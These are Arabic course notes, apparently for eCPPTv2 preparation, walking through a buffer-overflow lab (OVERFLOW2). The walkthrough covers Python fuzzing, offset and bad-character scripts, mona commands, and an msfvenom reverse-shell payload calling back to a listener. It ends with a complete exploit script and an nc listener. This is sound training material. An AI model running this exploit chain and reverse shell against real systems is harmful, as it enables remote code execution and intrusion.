# Session 2 (eCPPTv2) - Day 2
## Penetration Testing: System Security Part 2  

السلام عليكم ورحمة الله وبركاته  

اليوم باذن الله راح نبدا من الي وقفنا عليه امس  


اول شي معنا اليوم راح نطبق نفس الي اخذناه امس باذن الله بنفس الطريقة  


---  

Buffer Overflow Prep: OVERFLOW2  
--------------------------------|  

1- Offset  
2- BadChar  
3- Jump to ESP by mona or Manual  

طبعا لو كان بالـ jmb ESP حصلت bad characters لازم تغيره  

---
طبعا اول شي راح نسويه الي هو الـ Fuzzer  
```python
#!/usr/bin/env python3

import socket, time, sys

ip = ""

port = 
timeout = 5
prefix = "OVERFLOW2 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

```  
طبعا بعد ماشغلناه وكرش قالنا انه كرش عند 700 بايت راح نزود 100 بايت  

الان بنسوي نمط معين من الاحرف عشان نشوف وين يكرش بالضبط  
```bash
msf-pattern_create -l 800  
```  
طبعا كل 4 بايت مختلفه عن الثاني تماما  

طبعا نسوي run للبرنامج الان ونعطيه النمط الي سويناه  
```bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
```  

ف كتبت هذا السكربت بحيث نعرف كم قيمة الـ offset  
```python
#!/usr/bin/env python3

import socket

ip = ''
port =

pattren = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

string = "OVERFLOW2 " + pattren


try:
     with socket.socket() as s:
         s.connect((ip,port))
         print("sending pattren")
         s.send(bytes(string,'latin-1'))
except:
    print("failed to connect")
```  

نشوف انه عطانا قيمة الـ EIP 76413176  

طبعا الان كيف بنطلع الـ offset?  

طبعا الان نروح سايبرشيف ونشوف قيمة كل بايت عشان نعرف ايش هي ال4 احرف  
```bash
76 41 31 76  
From hex  
```  
نشوف انه قالنا انه قيمة الهيكس اللي عطيناه اياه هي vA1v  
وهذا يعني ان الاربع بايتات اقدر اتلاعب فيها وهي القيمة الي تمثل الـ EIP  
لو نحطه طبعا في اي محرر نصوص ونشوف وين الاحرف الاربعه هذي مابعدها كلها ينحذف لانه بيكون هو الـ shell code  
فراح نحصل انه يعادل الـ offset 634

او نستخدم الطريقة الثانيه والاسرع باستخدام mona  

الان عشان نحسب المسافة الي نحتاجها عشان نبدا نكتب على الـ eip  
```bash
!mona findmsp -distance 800  
```  

ونشوف انه عطانا ان الـ offset  634  

طبعا سويت هذا السكربت عشان نقدر نكتشف الـ bad characters  
```python
#!/usr/bin/env python3

import socket


ip = '10.10.72.247'
port = 1337

# The bad chars it's: \x00\x23\x3c\x83\xba
badchar = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

string = "OVERFLOW2 " + 634*"A" + 4*"B" + badchar

try:
    with socket.socket() as s:
        s.connect((ip,port))
        print("sending pattren")
        s.send(bytes(string,'latin-1'))
except:
    print("faild to connect")
 
```  

طبعا هذي كل الاحرف لكن حذفنا \x00 لانه null byet by default  

طبعا فيه امر يعطيك ال bad characters array عن طريق الـ mona  
```bash
!mona bytearray -cpb "\x00" 
```  

الان نسوي له run ونشوف وش يعطينا   

الان نشوف انه كرش وقيمة الـ EIP صارت 42424242 لانه حاطين الريتيرن BBBB  

عرفنا انه نقدر نكتب على ال EIP بس نستبدل ال BBBB من المتغير retn  

طبعا الان لابد نشوف ال Stack ونبدا بالترتيب لابد نعرف وش الي مانكتب بالستاك هذا يعتبر bad characters  

وتقعد كلشوي تحذف بادكراكتر انت حصلته وترجع تسوي رن للبرنامج وتشوف الترتيب اذا نفسه كويس اذا فيه شي مانكتب يعتبر bad char وعلى هذا الحال لين  تشوف انها ترتبت زي مانت كاتبها بالاكسبلويت  

فهذي هي الـ bad characters الي حصلناها  
```bash
Bad characters it's
\x00\x23\x3c\x83\xba  
```  

فيه طريقة ثانيه لكن مو مره سليمه او دقيقه الي هي عن طريق الـ mona  
```bash
!mona config -set workingfolder c:\mona\%p [to set working Directory]  
!mona compare -f c:\mona\bytearray.bin -a 0182FA30 [to find out the bad characters]  
```  
طبعا قيمة -a متغيره على حسب الادرس حق الـ ESP  
لكن زي ماذكرت سابقا غير دقيق ولازم تعقب وراه ف يفضل تستخدم الطريقة الاولى  

بعد ماحصلناه الان نحتاج الى jmp esp  
```bash
!mona jmp -r esp -cpb "\x00"
```  

ولابد نضيف باقي البادكركترز مع الـ \x00  

بعدها راح يطلع لنا الـ Address for jmp esp  
ولنفترض انه  
```bash
625011AF FFE4 JMP ESP  
```  

الان راح نسوي الـ Shell code باتسخدام msfvenome  
```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.18.114.37 lport=9001 EXTIFUNX=thread -b "\x00\x07\x2e\xa0" -f python -v "sc"  
```  

طيب الان سوينا الـ Shell Code  
الان راح نكتب الاكسبلويت بهذي الطريقة  
```python
#!/usr/bin/env python3

import socket


ip = '10.10.72.247'
port = 1337

#replace it with your shellcode  
sc = ""

#replace it with your command chall  
command = "OVERFLOW2 "

#replce the offset number depending on the situation  
offset = 634*"A"

#replce the jmp address depending on the situation  
jmp = "\xAF\x11\x50\x62"

nops = 16*"\x90"
string = command + offset + jmp + nops + sc

try:
    with socket.socket() as s:
        s.connect((ip,port))
        print("sending exploit")
        s.send(bytes(string,'latin-1'))
except:
    print("faild to connect")
```  

بعدها راح نفتح الليسنر ولابد يكون نفس البورت الي حددناه عند انشاء shellcode ولابد يكون متاح  
```bash
nc -nlvp 9001  
```  

الان راح نشغل الاكسبلويت  
BOOM! we get shell ;)  

الى هنا انتهى اللاب الثاني وباذن الله راح نكمل بكرا  

---

## Follow us on:  
Twitter:  
[s4cript](https://twitter.com/s4cript)  
[cyberhub](https://twitter.com/cyberhub)  
[0xNawaF1](https://twitter.com/0xNawaF1)  